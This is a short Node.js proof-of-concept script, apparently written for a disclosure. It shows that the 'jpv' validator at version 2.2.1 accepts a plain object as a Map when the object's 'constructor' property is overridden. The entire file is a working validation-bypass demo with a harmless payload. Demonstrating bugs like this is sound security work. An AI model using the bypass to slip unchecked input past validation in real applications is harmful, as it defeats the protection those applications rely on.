const jpv = require('jpv')
exampleJPV()

// Demo for the constructor bypass on version 2.2.1 
function exampleJPV() {
	console.log("On JPV version 2.2.1, we can override the constructor of our input to be an object constructor to bypass JPV validation")

	console.log("	our schema should be: aMap: new Map()");
	const schema = {
		aMap: new Map()
	};

	console.log("This bad input below tricks jpv");

	console.log("	aMap: {\n	badcode: \"problematic input.\",\n	constructor: new Map().constructor \n	}");

	const input = {
		aMap: {
		  badcode: "problematic input.", 
		  constructor: new Map().constructor
		}
	};

	// jpv.validate(input, schema) should return false, but, as of 2.2.1, returns true
	console.log("jpv.validate(input, schema) = " + jpv.validate(input, schema));

}